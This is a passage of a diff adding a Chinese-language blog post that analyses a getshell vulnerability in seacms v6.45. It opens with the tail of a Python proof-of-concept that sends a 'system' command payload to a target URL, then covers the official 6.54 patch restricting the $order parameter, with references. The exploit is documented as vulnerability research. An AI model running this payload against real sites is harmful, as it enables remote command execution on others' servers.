class="line">                    <span class="string">"1"</span> : <span class="string">"system"</span>,</span><br><span class="line">                    <span class="string">"2"</span> : code</span><br><span class="line">                &#125;</span><br><span class="line">                r = requests.post(url = sys.argv[<span class="number">1</span>], data = postdata)</span><br><span class="line">                idx = r.text.find(<span class="string">"&lt;!DOCTYPE html&gt;"</span>)</span><br><span class="line">                print(r.text[:idx])</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        poc()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">"It only works for seacms v6.45!"</span>)</span><br></pre></td></tr></table></figure>
+
+<p>结果：</p>
+<p><img src="/2020/01/31/seacms6.45%E5%89%8D%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/imgs/16.png" alt="16"></p>
+<h4 id="官方补丁"><a href="#官方补丁" class="headerlink" title="官方补丁"></a>官方补丁</h4><p>该漏洞seacms在6.54版本中进行了修复，修复内容如下。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$order = ($order == <span class="string">"commend"</span> || $order == <span class="string">"time"</span> || $order == <span class="string">"hit"</span>) ? $order : <span class="string">""</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/01/31/seacms6.45%E5%89%8D%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/imgs/patch_645.png" alt="patch_645"></p>
+<p>这样修复的目的是禁止攻击者再通过<code>$order</code>参数传入payload，攻击者通过<code>$order</code>传入的参数如果不为commend、time或者hit都会被清空。</p>
+<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ol>
+<li><a href="https://www.cnblogs.com/tr1ple/p/11101008.html" target="_blank" rel="noopener">https://www.cnblogs.com/tr1ple/p/11101008.html</a> </li>
+<li><a href="https://www.cnblogs.com/tr1ple/p/11100975.html" target="_blank" rel="noopener">https://www.cnblogs.com/tr1ple/p/11100975.html</a> </li>
+<li><a href="https://bbs.ichunqiu.com/thread-35085-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-35085-1-1.html</a> </li>
+<li><a href="https://www.freebuf.com/column/150731.html" target="_blank" rel="noopener">https://www.freebuf.com/column/150731.html</a> </li>
+</ol>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Bantian</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://bantttian.github.io/2020/01/31/seacms6.45%E5%89%8D%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">https://bantttian.github.io/2020/01/31/seacms6.45%E5%89%8D%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>早睡早起身体好</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/Web/"># Web</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/02/01/seacms6.55%E5%89%8D%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">seacms6.55 前台getshell漏洞分析</a>
+            
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Bantian | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
